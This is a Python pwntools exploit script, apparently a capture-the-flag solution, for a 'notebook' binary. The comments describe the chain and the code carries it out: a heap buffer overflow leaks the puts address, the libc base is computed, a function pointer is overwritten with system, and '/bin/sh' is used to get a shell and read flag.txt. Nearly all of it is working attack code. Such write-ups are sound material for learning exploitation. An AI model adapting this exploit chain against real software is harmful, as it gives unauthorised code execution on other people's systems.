#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF("./notebook", checksec=False)
context.log_level = "error"

# For the container:
# I dont know why, but sometimes recv is "too fast" and does not clear the whole pipe
# So if something gets "stuck" in pipe the whole programm does not work anymore.... yeah don't know how to fix this.
# Looking forward to friday for a fix

# Idea:
# 1. Create simple Note
# 2. Create printable Note (both smaller than 80 Bytes ==> both fast bins, same heap area)
# 3. Overflow simple Note via change Note (bufferoverflow via read 160 bytes)
# 4. Leak puts with it (140 Byte overflow and we get some bytes printet out of puts)
# 5. Load libc and calculate offset via puts symbol
# 6. Load system (and /bin/sh pointer)
# 7. Write system at the addr where puts was (in the printable note struct; wanted to add the pointer to the shell at the same time, but that did not work; got an error where sh said it could not work with input xD)
# 8. Write /bin/sh at printablenote text
# 9. Call print printable note 
# ==> it will call system with /bin/sh as a parameter
# ==> because rdx will be called (where normally puts where; now system)
# ==> in rdi (first reg; SYSTEM V Calling Convention) will be the text of printable note (but this ist /bin/sh)
# PROFIT SHELL LETS GO 


def start(argv=[], *a, **kw):
    gdbscript = """
    tbreak main
    continue
    """.format(
        **locals()
    )

    if args.GDB:
        context.log_level = "debug"
        context.terminal = ["tmux", "split", "-h"]
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# you can also create new functions here

def main():
    io = start()

    # Just do the first few Calls to the Programm as described above
    io.recvuntil(b"7) Exit")
    io.sendline(b'1')
    io.recvuntil(b"60 characters:")
    io.sendline(b"Do you know the Story of Darth Pleguis the wise?")
    io.recvuntil(b"7) Exit")
    io.sendline(b"2")
    io.recvuntil(b"60 characters:")
    io.sendline(b"He was a jedi master")
    io.recvuntil(b"default_print:")
    io.sendline(b"1")
    io.recvuntil(b"7) Exit")
    io.sendline(b"3")
    io.recvuntil(b"change:")
    io.sendline(b"0")
    io.recvuntil(b"new text:")
    io.sendline(cyclic(143))
    io.recvuntil(b"7) Exit")
    io.sendline(b"6")
    io.recvuntil(b"to show:")
    io.sendline(b"0")
    #io.interactive()
    # Now we get the puts addr. leaked
    temp = io.recvuntil(b"7) Exit")[65:71]
    temp += b"\x00\x00"
    puts = u64(temp)

    # get the base of LIBC + a few symbols
    libc = ELF("/usr/lib/libc.so.6", checksec=False) 
    libc.address = puts - libc.sym["puts"]

    system = libc.sym['system']

    # Wrapper + system overrides puts 
    payload = cyclic(144)
    payload += p64(system)

    io.sendline(b"3")
    io.recvuntil(b"to change:")
    io.sendline(b"0")
    io.recvuntil(b"new text:")
    io.sendline(payload)
    io.recvuntil(b"7) Exit")
    io.sendline(b"4")
    io.recvuntil(b"to change:")
    io.sendline(b"0")
    io.recvuntil(b"new text:")
    # Write /bin/sh into printablenote start text
    io.sendline(b"/bin/sh")
    io.recvuntil(b"7) Exit")
    io.sendline(b"6")
    io.recvuntil(b"to show:")
    io.sendline(b"0")
    # now we have a shell, so just gimmme the flag
    io.sendline(b"cat flag.txt")
    print(io.recvuntil(b"}").decode('utf-8')[1:])

if __name__ == "__main__":
    main()
